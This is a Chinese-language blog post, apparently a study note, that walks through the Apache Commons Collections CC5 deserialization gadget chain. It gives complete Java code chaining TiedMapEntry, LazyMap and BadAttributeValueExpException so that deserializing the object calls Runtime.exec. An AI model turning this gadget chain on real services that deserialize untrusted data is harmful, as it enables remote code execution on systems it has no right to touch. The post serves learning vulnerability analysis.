@@ -1,0 +1,421 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=2">
+<meta name="theme-color" content="#222">
+<meta name="generator" content="Hexo 6.3.0">
+  <link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon-next.png">
+  <link rel="icon" type="image/png" sizes="32x32" href="/images/favicon-32x32-next.png">
+  <link rel="icon" type="image/png" sizes="16x16" href="/images/favicon-16x16-next.png">
+  <link rel="mask-icon" href="/images/logo.svg" color="#222">
+
+<link rel="stylesheet" href="/css/main.css">
+
+
+<link rel="stylesheet" href="/lib/font-awesome/css/all.min.css">
+
+<script id="hexo-configurations">
+    var NexT = window.NexT || {};
+    var CONFIG = {"hostname":"example.com","root":"/","scheme":"Muse","version":"7.8.0","exturl":false,"sidebar":{"position":"left","display":"post","padding":18,"offset":12,"onmobile":false},"copycode":{"enable":false,"show_result":false,"style":null},"back2top":{"enable":true,"sidebar":false,"scrollpercent":false},"bookmark":{"enable":false,"color":"#222","save":"auto"},"fancybox":false,"mediumzoom":false,"lazyload":false,"pangu":false,"comments":{"style":"tabs","active":null,"storage":true,"lazyload":false,"nav":null},"algolia":{"hits":{"per_page":10},"labels":{"input_placeholder":"Search for Posts","hits_empty":"We didn't find any results for the search: ${query}","hits_stats":"${hits} results found in ${time} ms"}},"localsearch":{"enable":false,"trigger":"auto","top_n_per_article":1,"unescape":false,"preload":false},"motion":{"enable":true,"async":false,"transition":{"post_block":"fadeIn","post_header":"slideDownIn","post_body":"slideDownIn","coll_header":"slideLeftIn","sidebar":"slideUpIn"}}};
+  </script>
+
+  <meta name="description" content="作者：Narcher	时间：2024&#x2F;3&#x2F;19	分类：Vulnerability Analysis">
+<meta property="og:type" content="article">
+<meta property="og:title" content="JAVA安全:CC5链">
+<meta property="og:url" content="http://example.com/2024/11/08/JAVA%E5%AE%89%E5%85%A8CC5%E9%93%BE/index.html">
+<meta property="og:site_name" content="Narcherの小窝">
+<meta property="og:description" content="作者：Narcher	时间：2024&#x2F;3&#x2F;19	分类：Vulnerability Analysis">
+<meta property="og:locale" content="en_US">
+<meta property="og:image" content="http://example.com/2024/11/08/JAVA%E5%AE%89%E5%85%A8CC5%E9%93%BE/1710853519154.png">
+<meta property="og:image" content="http://example.com/2024/11/08/JAVA%E5%AE%89%E5%85%A8CC5%E9%93%BE/1710853749908.png">
+<meta property="og:image" content="http://example.com/2024/11/08/JAVA%E5%AE%89%E5%85%A8CC5%E9%93%BE/1710853880435.png">
+<meta property="og:image" content="http://example.com/2024/11/08/JAVA%E5%AE%89%E5%85%A8CC5%E9%93%BE/1710854104973.png">
+<meta property="og:image" content="http://example.com/2024/11/08/JAVA%E5%AE%89%E5%85%A8CC5%E9%93%BE/1710855036609.png">
+<meta property="article:published_time" content="2024-11-08T06:38:16.504Z">
+<meta property="article:modified_time" content="2024-03-25T12:30:56.368Z">
+<meta property="article:author" content="Narcher Alter">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:image" content="http://example.com/2024/11/08/JAVA%E5%AE%89%E5%85%A8CC5%E9%93%BE/1710853519154.png">
+
+<link rel="canonical" href="http://example.com/2024/11/08/JAVA%E5%AE%89%E5%85%A8CC5%E9%93%BE/">
+
+
+<script id="page-configurations">
+  // https://hexo.io/docs/variables.html
+  CONFIG.page = {
+    sidebar: "",
+    isHome : false,
+    isPost : true,
+    lang   : 'en'
+  };
+</script>
+
+  <title>JAVA安全:CC5链 | Narcherの小窝</title>
+  
+
+
+
+
+
+
+  <noscript>
+  <style>
+  .use-motion .brand,
+  .use-motion .menu-item,
+  .sidebar-inner,
+  .use-motion .post-block,
+  .use-motion .pagination,
+  .use-motion .comments,
+  .use-motion .post-header,
+  .use-motion .post-body,
+  .use-motion .collection-header { opacity: initial; }
+
+  .use-motion .site-title,
+  .use-motion .site-subtitle {
+    opacity: initial;
+    top: initial;
+  }
+
+  .use-motion .logo-line-before i { left: initial; }
+  .use-motion .logo-line-after i { right: initial; }
+  </style>
+</noscript>
+
+</head>
+
+<body itemscope itemtype="http://schema.org/WebPage">
+  <div class="container use-motion">
+    <div class="headband"></div>
+
+    <header class="header" itemscope itemtype="http://schema.org/WPHeader">
+      <div class="header-inner"><div class="site-brand-container">
+  <div class="site-nav-toggle">
+    <div class="toggle" aria-label="Toggle navigation bar">
+      <span class="toggle-line toggle-line-first"></span>
+      <span class="toggle-line toggle-line-middle"></span>
+      <span class="toggle-line toggle-line-last"></span>
+    </div>
+  </div>
+
+  <div class="site-meta">
+
+    <a href="/" class="brand" rel="start">
+      <span class="logo-line-before"><i></i></span>
+      <h1 class="site-title">Narcherの小窝</h1>
+      <span class="logo-line-after"><i></i></span>
+    </a>
+  </div>
+
+  <div class="site-nav-right">
+    <div class="toggle popup-trigger">
+    </div>
+  </div>
+</div>
+
+
+
+
+<nav class="site-nav">
+  <ul id="menu" class="main-menu menu">
+        <li class="menu-item menu-item-home">
+
+    <a href="/" rel="section"><i class="fa fa-home fa-fw"></i>Home</a>
+
+  </li>
+        <li class="menu-item menu-item-archives">
+
+    <a href="/archives/" rel="section"><i class="fa fa-archive fa-fw"></i>Archives</a>
+
+  </li>
+  </ul>
+</nav>
+
+
+
+
+</div>
+    </header>
+
+    
+  <div class="back-to-top">
+    <i class="fa fa-arrow-up"></i>
+    <span>0%</span>
+  </div>
+
+
+    <main class="main">
+      <div class="main-inner">
+        <div class="content-wrap">
+          
+
+          <div class="content post posts-expand">
+            
+
+    
+  
+  
+  <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="en">
+    <link itemprop="mainEntityOfPage" href="http://example.com/2024/11/08/JAVA%E5%AE%89%E5%85%A8CC5%E9%93%BE/">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="image" content="/images/avatar.gif">
+      <meta itemprop="name" content="Narcher Alter">
+      <meta itemprop="description" content="">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="Narcherの小窝">
+    </span>
+      <header class="post-header">
+        <h1 class="post-title" itemprop="name headline">
+          JAVA安全:CC5链
+        </h1>
+
+        <div class="post-meta">
+            <span class="post-meta-item">
+              <span class="post-meta-item-icon">
+                <i class="far fa-calendar"></i>
+              </span>
+              <span class="post-meta-item-text">Posted on</span>
+
+              <time title="Created: 2024-11-08 14:38:16" itemprop="dateCreated datePublished" datetime="2024-11-08T14:38:16+08:00">2024-11-08</time>
+            </span>
+              <span class="post-meta-item">
+                <span class="post-meta-item-icon">
+                  <i class="far fa-calendar-check"></i>
+                </span>
+                <span class="post-meta-item-text">Edited on</span>
+                <time title="Modified: 2024-03-25 20:30:56" itemprop="dateModified" datetime="2024-03-25T20:30:56+08:00">2024-03-25</time>
+              </span>
+
+          
+
+        </div>
+      </header>
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
+
+      
+        <p><em>作者：Narcher</em>	<em>时间：2024&#x2F;3&#x2F;19</em>	<em>分类：Vulnerability Analysis</em></p>
+<span id="more"></span>
+
+<h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p>CC5的限制比较多，对于jdk版本以及必须WITHOUT a security manager</p>
+<p>实际上这个CC5链和CC1很像啊，只是改变了LazyMap的get方法的触发方式，为了记录学习过程，还是写下来吧。</p>
+<h2 id="正文"><a href="#正文" class="headerlink" title="正文"></a>正文</h2><p>先看一下ysoserial的CC5流程：</p>
+<img src="/2024/11/08/JAVA%E5%AE%89%E5%85%A8CC5%E9%93%BE/1710853519154.png" alt="1710853519154" style="zoom:67%;">
+
+<p>由于和CC1链很像，我们就先把CC1复制过来看看：</p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line">Transformer[] transformers=<span class="keyword">new</span> <span class="title class_">Transformer</span>[]&#123;</span><br><span class="line">        <span class="keyword">new</span> <span class="title class_">ConstantTransformer</span>(Runtime.class),</span><br><span class="line">        <span class="keyword">new</span> <span class="title class_">InvokerTransformer</span>(<span class="string">&quot;getDeclaredMethod&quot;</span>,<span class="keyword">new</span> <span class="title class_">Class</span>[]&#123;String.class,Class[].class&#125;,<span class="keyword">new</span> <span class="title class_">Object</span>[]&#123;<span class="string">&quot;getRuntime&quot;</span>,<span class="literal">null</span>&#125;),</span><br><span class="line">        <span class="keyword">new</span> <span class="title class_">InvokerTransformer</span>(<span class="string">&quot;invoke&quot;</span>,<span class="keyword">new</span> <span class="title class_">Class</span>[]&#123;Object.class,Object[].class&#125;,<span class="keyword">new</span> <span class="title class_">Object</span>[]&#123;<span class="literal">null</span>,<span class="literal">null</span>&#125;),</span><br><span class="line">        <span class="keyword">new</span> <span class="title class_">InvokerTransformer</span>(<span class="string">&quot;exec&quot;</span>,<span class="keyword">new</span> <span class="title class_">Class</span>[]&#123;String.class&#125;,<span class="keyword">new</span> <span class="title class_">Object</span>[]&#123;<span class="string">&quot;calc&quot;</span>&#125;)</span><br><span class="line">&#125;;</span><br><span class="line">ChainedTransformer chainedTransformer= <span class="keyword">new</span> <span class="title class_">ChainedTransformer</span>(transformers);</span><br><span class="line">HashMap&lt;Object,Object&gt; map = <span class="keyword">new</span> <span class="title class_">HashMap</span>&lt;&gt;();</span><br><span class="line">map.put(<span class="string">&quot;value&quot;</span>,<span class="string">&quot;value&quot;</span>);</span><br><span class="line"><span class="type">LazyMap</span> <span class="variable">innerMap</span> <span class="operator">=</span> (LazyMap) LazyMap.decorate(map, chainedTransformer);</span><br><span class="line"><span class="comment">//反射获取AnnotationInvocationHandler类</span></span><br><span class="line"><span class="type">Class</span> <span class="variable">c</span> <span class="operator">=</span> Class.forName(<span class="string">&quot;sun.reflect.annotation.AnnotationInvocationHandler&quot;</span>);</span><br><span class="line"><span class="type">Constructor</span> <span class="variable">constructor</span> <span class="operator">=</span> c.getDeclaredConstructor(Class.class, Map.class);</span><br><span class="line">constructor.setAccessible(<span class="literal">true</span>);</span><br><span class="line"><span class="type">InvocationHandler</span> <span class="variable">handler</span> <span class="operator">=</span> (InvocationHandler) constructor.newInstance(Target.class,innerMap);</span><br><span class="line"><span class="type">Map</span> <span class="variable">proxyMap</span> <span class="operator">=</span> (Map) Proxy.newProxyInstance(Map.class.getClassLoader(),<span class="keyword">new</span> <span class="title class_">Class</span>[]&#123;Map.class&#125;,handler);</span><br><span class="line">handler = (InvocationHandler) constructor.newInstance(Target.class, proxyMap);</span><br><span class="line"><span class="comment">//序列化</span></span><br><span class="line"><span class="type">ObjectOutputStream</span> <span class="variable">oos</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ObjectOutputStream</span>(<span class="keyword">new</span> <span class="title class_">FileOutputStream</span>(<span class="string">&quot;C:\\Users\\Narcher\\IdeaProjects\\CC1.txt&quot;</span>));</span><br><span class="line">oos.writeObject(handler);</span><br><span class="line"><span class="comment">//反序列化</span></span><br><span class="line"><span class="type">ObjectInputStream</span> <span class="variable">ois</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ObjectInputStream</span>(<span class="keyword">new</span> <span class="title class_">FileInputStream</span>(<span class="string">&quot;C:\\Users\\Narcher\\IdeaProjects\\CC1.txt&quot;</span>));</span><br><span class="line">ois.readObject();</span><br></pre></td></tr></table></figure>
+
+<p>我们需要改的就是LazyMap的后边，先看看调用get方法的类吧</p>
+<h3 id="1-TiedMapEntry部分"><a href="#1-TiedMapEntry部分" class="headerlink" title="1.TiedMapEntry部分"></a>1.TiedMapEntry部分</h3><img src="/2024/11/08/JAVA%E5%AE%89%E5%85%A8CC5%E9%93%BE/1710853749908.png" alt="1710853749908" style="zoom:67%;">
+
+<p>可见TiedMapEntry的getValue方法调用了get方法，可作为一个点，我们继续往上找：</p>
+<img src="/2024/11/08/JAVA%E5%AE%89%E5%85%A8CC5%E9%93%BE/1710853880435.png" alt="1710853880435" style="zoom:67%;">
+
+<p>可见其toString方法调用了getValue方法，我们再往上找</p>
+<h3 id="2-BadAttributeValueExpException部分"><a href="#2-BadAttributeValueExpException部分" class="headerlink" title="2.BadAttributeValueExpException部分"></a>2.BadAttributeValueExpException部分</h3><img src="/2024/11/08/JAVA%E5%AE%89%E5%85%A8CC5%E9%93%BE/1710854104973.png" alt="1710854104973" style="zoom:67%;">
+
+<p>可见BadAttributeValueExpException的readObject方法调用了toString方法，我们接下来只需要让valObj是我们传入的TiedMapEntry实例就行了，我们来看看valObj怎么来的：</p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">ObjectInputStream.<span class="type">GetField</span> <span class="variable">gf</span> <span class="operator">=</span> ois.readFields();</span><br><span class="line"><span class="type">Object</span> <span class="variable">valObj</span> <span class="operator">=</span> gf.get(<span class="string">&quot;val&quot;</span>, <span class="literal">null</span>);</span><br></pre></td></tr></table></figure>
+
+<p>说白了，valObj的值就是从输入流ois中读取的对象的”val”字段的值。如果该字段不存在或者值为null，valObj的值就会是null。</p>
+<p>那么怎么控制val呢？如果直接在构造器中调用的话，那么在构造的时候就会直接触发这条链子，很简单，用反射不就是了</p>
+<img src="/2024/11/08/JAVA%E5%AE%89%E5%85%A8CC5%E9%93%BE/1710855036609.png" alt="1710855036609" style="zoom:67%;">
+
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">BadAttributeValueExpException</span> <span class="variable">badAttributeValueExpException</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">BadAttributeValueExpException</span>(<span class="literal">null</span>);</span><br><span class="line"><span class="type">Class</span> <span class="variable">c</span> <span class="operator">=</span> badAttributeValueExpException.getClass();</span><br><span class="line"><span class="type">Field</span> <span class="variable">valField</span> <span class="operator">=</span> c.getDeclaredField(<span class="string">&quot;val&quot;</span>);</span><br><span class="line">valField.setAccessible(<span class="literal">true</span>);</span><br><span class="line">valField.set(badAttributeValueExpException, tiedMapEntry);</span><br></pre></td></tr></table></figure>
+
+<h3 id="3-构造链"><a href="#3-构造链" class="headerlink" title="3.构造链"></a>3.构造链</h3><p>把上边的直接改到CC1链子里就行了：</p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line">Transformer[] transformers=<span class="keyword">new</span> <span class="title class_">Transformer</span>[]&#123;</span><br><span class="line">        <span class="keyword">new</span> <span class="title class_">ConstantTransformer</span>(Runtime.class),</span><br><span class="line">        <span class="keyword">new</span> <span class="title class_">InvokerTransformer</span>(<span class="string">&quot;getDeclaredMethod&quot;</span>,<span class="keyword">new</span> <span class="title class_">Class</span>[]&#123;String.class,Class[].class&#125;,<span class="keyword">new</span> <span class="title class_">Object</span>[]&#123;<span class="string">&quot;getRuntime&quot;</span>,<span class="literal">null</span>&#125;),</span><br><span class="line">        <span class="keyword">new</span> <span class="title class_">InvokerTransformer</span>(<span class="string">&quot;invoke&quot;</span>,<span class="keyword">new</span> <span class="title class_">Class</span>[]&#123;Object.class,Object[].class&#125;,<span class="keyword">new</span> <span class="title class_">Object</span>[]&#123;<span class="literal">null</span>,<span class="literal">null</span>&#125;),</span><br><span class="line">        <span class="keyword">new</span> <span class="title class_">InvokerTransformer</span>(<span class="string">&quot;exec&quot;</span>,<span class="keyword">new</span> <span class="title class_">Class</span>[]&#123;String.class&#125;,<span class="keyword">new</span> <span class="title class_">Object</span>[]&#123;<span class="string">&quot;calc&quot;</span>&#125;)</span><br><span class="line">&#125;;</span><br><span class="line">ChainedTransformer chainedTransformer= <span class="keyword">new</span> <span class="title class_">ChainedTransformer</span>(transformers);</span><br><span class="line">HashMap&lt;Object,Object&gt; map = <span class="keyword">new</span> <span class="title class_">HashMap</span>&lt;&gt;();</span><br><span class="line">map.put(<span class="string">&quot;value&quot;</span>,<span class="string">&quot;value&quot;</span>);</span><br><span class="line"><span class="type">LazyMap</span> <span class="variable">innerMap</span> <span class="operator">=</span> (LazyMap) LazyMap.decorate(map, chainedTransformer);</span><br><span class="line"><span class="comment">//反射</span></span><br><span class="line"><span class="type">TiedMapEntry</span> <span class="variable">tiedMapEntry</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">TiedMapEntry</span>(innerMap, <span class="string">&quot;aaa&quot;</span>);</span><br><span class="line"><span class="type">BadAttributeValueExpException</span> <span class="variable">badAttributeValueExpException</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">BadAttributeValueExpException</span>(<span class="literal">null</span>);</span><br><span class="line"><span class="type">Class</span> <span class="variable">c</span> <span class="operator">=</span> badAttributeValueExpException.getClass();</span><br><span class="line"><span class="type">Field</span> <span class="variable">valField</span> <span class="operator">=</span> c.getDeclaredField(<span class="string">&quot;val&quot;</span>);</span><br><span class="line">valField.setAccessible(<span class="literal">true</span>);</span><br><span class="line">valField.set(badAttributeValueExpException, tiedMapEntry);</span><br><span class="line"><span class="comment">//序列化</span></span><br><span class="line"><span class="type">ObjectOutputStream</span> <span class="variable">oos</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ObjectOutputStream</span>(<span class="keyword">new</span> <span class="title class_">FileOutputStream</span>(<span class="string">&quot;C:\\Users\\Narcher\\IdeaProjects\\CC1.txt&quot;</span>));</span><br><span class="line">oos.writeObject(badAttributeValueExpException);</span><br><span class="line"><span class="comment">//反序列化</span></span><br><span class="line"><span class="type">ObjectInputStream</span> <span class="variable">ois</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ObjectInputStream</span>(<span class="keyword">new</span> <span class="title class_">FileInputStream</span>(<span class="string">&quot;C:\\Users\\Narcher\\IdeaProjects\\CC1.txt&quot;</span>));</span><br><span class="line">ois.readObject();</span><br></pre></td></tr></table></figure>
+
+<p>CC5就完成了。</p>
+
+    </div>
+
+    
+    
+    
+
+      <footer class="post-footer">
+
+        
+
+
+        
+    <div class="post-nav">
+      <div class="post-nav-item">
+    <a href="/2024/11/08/JAVA%E5%AE%89%E5%85%A8CC4%E9%93%BE/" rel="prev" title="JAVA安全:CC4链">
+      <i class="fa fa-chevron-left"></i> JAVA安全:CC4链
+    </a></div>
+      <div class="post-nav-item">
+    <a href="/2024/11/08/JAVA%E5%AE%89%E5%85%A8CC6%E9%93%BE/" rel="next" title="JAVA安全:CC6链">
+      JAVA安全:CC6链 <i class="fa fa-chevron-right"></i>
+    </a></div>
+    </div>
+      </footer>
+    
+  </article>
+  
+  
+  
+
+
+
+          </div>
+          
+
+<script>
+  window.addEventListener('tabs:register', () => {
+    let { activeClass } = CONFIG.comments;
+    if (CONFIG.comments.storage) {
+      activeClass = localStorage.getItem('comments_active') || activeClass;
+    }
+    if (activeClass) {
+      let activeTab = document.querySelector(`a[href="#comment-${activeClass}"]`);
+      if (activeTab) {
+        activeTab.click();
+      }
+    }
+  });
+  if (CONFIG.comments.storage) {
+    window.addEventListener('tabs:click', event => {
+      if (!event.target.matches('.tabs-comment .tab-content .tab-pane')) return;
+      let commentClass = event.target.classList[1];
+      localStorage.setItem('comments_active', commentClass);
+    });
+  }
+</script>
+
+        </div>
+          
+  
+  <div class="toggle sidebar-toggle">
+    <span class="toggle-line toggle-line-first"></span>
+    <span class="toggle-line toggle-line-middle"></span>
+    <span class="toggle-line toggle-line-last"></span>
+  </div>
+
+  <aside class="sidebar">
+    <div class="sidebar-inner">
+
+      <ul class="sidebar-nav motion-element">
+        <li class="sidebar-nav-toc">
+          Table of Contents
+        </li>
+        <li class="sidebar-nav-overview">
+          Overview
+        </li>
+      </ul>
+
+      <!--noindex-->
+      <div class="post-toc-wrap sidebar-panel">
+          <div class="post-toc motion-element"><ol class="nav"><li class="nav-item nav-level-2"><a class="nav-link" href="#%E5%89%8D%E8%A8%80"><span class="nav-number">1.</span> <span class="nav-text">前言</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E6%AD%A3%E6%96%87"><span class="nav-number">2.</span> <span class="nav-text">正文</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#1-TiedMapEntry%E9%83%A8%E5%88%86"><span class="nav-number">2.1.</span> <span class="nav-text">1.TiedMapEntry部分</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#2-BadAttributeValueExpException%E9%83%A8%E5%88%86"><span class="nav-number">2.2.</span> <span class="nav-text">2.BadAttributeValueExpException部分</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#3-%E6%9E%84%E9%80%A0%E9%93%BE"><span class="nav-number">2.3.</span> <span class="nav-text">3.构造链</span></a></li></ol></li></ol></div>
+      </div>
+      <!--/noindex-->
+
+      <div class="site-overview-wrap sidebar-panel">
+        <div class="site-author motion-element" itemprop="author" itemscope itemtype="http://schema.org/Person">
+  <p class="site-author-name" itemprop="name">Narcher Alter</p>
+  <div class="site-description" itemprop="description"></div>
+</div>
+<div class="site-state-wrap motion-element">
+  <nav class="site-state">
+      <div class="site-state-item site-state-posts">
+          <a href="/archives/">
+        
+          <span class="site-state-item-count">27</span>
+          <span class="site-state-item-name">posts</span>
+        </a>
+      </div>
+  </nav>
+</div>
+
+
+
+      </div>
+
+    </div>
+  </aside>
+  <div id="sidebar-dimmer"></div>
+
+
+      </div>
+    </main>
+
+    <footer class="footer">
+      <div class="footer-inner">
+        
+
+        
+
+<div class="copyright">
+  
+  &copy; 
+  <span itemprop="copyrightYear">2024</span>
+  <span class="with-love">
+    <i class="fa fa-heart"></i>
+  </span>
+  <span class="author" itemprop="copyrightHolder">Narcher Alter</span>
+</div>
+<!--
+  <div class="powered-by">Powered by <a href="https://hexo.io/" class="theme-link" rel="noopener" target="_blank">Hexo</a> & <a href="https://muse.theme-next.org/" class="theme-link" rel="noopener" target="_blank">NexT.Muse</a>
+  </div>
+-->
+
+        
+
+
+
+
+
+
+
+
+      </div>
+    </footer>
+  </div>
+
+  
+  <script src="/lib/anime.min.js"></script>
+  <script src="/lib/velocity/velocity.min.js"></script>
+  <script src="/lib/velocity/velocity.ui.min.js"></script>
+
+<script src="/js/utils.js"></script>
+
+<script src="/js/motion.js"></script>
+
+
+<script src="/js/schemes/muse.js"></script>
+
+
+<script src="/js/next-boot.js"></script>
+
+
+
+
+  
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+  
+
+  
+
+</body>
+</html>
